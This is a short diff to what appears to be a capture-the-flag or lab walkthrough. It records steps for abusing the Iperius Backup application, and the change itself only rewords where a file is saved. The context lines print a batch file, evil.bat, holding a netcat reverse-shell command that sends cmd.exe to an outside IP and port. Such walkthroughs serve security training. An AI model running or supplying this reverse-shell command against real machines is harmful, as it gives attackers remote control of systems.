@@ -83,7 +83,7 @@
 - Added content to a <code>notepad</code> file named <code>evil.bat</code>.<br>
 - <code>@echo off</code><br>
 - <code>C:\Users\McSkidy\Downloads\nc.exe -nv 10.10.72.55 1337 -e cmd.exe</code><br>
-- Saved <code>evil.bat</code> in the <code>C:\Users\McSkidy\Desktop\</code> path.<br>
+- Saved <code>evil.bat</code> in the path <code>C:\Users\McSkidy\Desktop\</code>.<br>
 - Clicked <code>OK</code>.<br>
 -----------------------------------<br>
 - Launched <code>Iperius Backup</code> application.<br>
